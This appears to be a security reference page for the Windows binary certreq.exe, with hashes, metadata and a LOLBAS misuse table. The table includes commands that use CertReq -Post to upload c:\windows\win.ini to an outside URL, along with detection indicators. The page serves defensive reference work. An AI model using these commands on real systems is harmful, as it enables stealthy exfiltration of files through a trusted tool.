---
title: certreq.exe | CertReq.exe
---

# certreq.exe 

* File Path: `C:\windows\SysWOW64\certreq.exe`
* Description: CertReq.exe

## Screenshot

![certreq.exe](screenshots/certreq.exe-81C07107AB05BD4C4AE1B7D889BCD4FE-2.png)

## Hashes

Type | Hash
-- | --
MD5 | `736F623EC009672F7FC2C2935B2498D4`
SHA1 | `6171A607D7EF2F6A1BC008E061A5DB33C3E60A2D`
SHA256 | `81956C77DF1E2006AD328D98BE39F837CCD044C172739237E330E850C86CA4F2`
SHA384 | `0D31B1B584B751EF949A51C7D4A0171E26AB0240D8F3071D420ADB591EA9CDEC143801A57D1845447B96248681C22F7B`
SHA512 | `F041857145111C1FA4499BDAF612BDB4443548D8BB778749127E18196687B4389BC192050809AD8CD5F9A2DFB4F816BA83D9276B9771E349C00682FE5DB6A495`
SSDEEP | `6144:/jjTEnjszN9nXbK7FKwdGBkvuvCyuqVlbkuK1K08AqkB:bjTEnjszN9nXq0kAkGvluqnXvk`

### Loaded Modules:

Path |
-- |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\SysWOW64\certreq.exe |


## Signature

* Status: The file C:\windows\SysWOW64\certreq.exe is not digitally signed. You cannot run this script on the current system. For more information about running scripts and setting execution policy, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170
* Serial: ``
* Thumbprint: ``
* Issuer: 
* Subject: 

## File Metadata

* Original Filename: CertReq.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 6.3.9600.16384 (winblue_rtm.130821-1623)
* Product Version: 6.3.9600.16384
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## Possible Misuse

*The following table contains possible examples of `certreq.exe` being misused. While `certreq.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `Name: CertReq.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - Command: CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - Command: CertReq -Post -config https://example.org/ c:\windows\win.ini and show response in terminal` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - Path: C:\Windows\System32\certreq.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - Path: C:\Windows\SysWOW64\certreq.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - IOC: certreq creates new files` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - IOC: certreq makes POST requests` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - Link: https://dtm.uk/certreq` | 



MIT License. Copyright (c) 2020 Strontic.


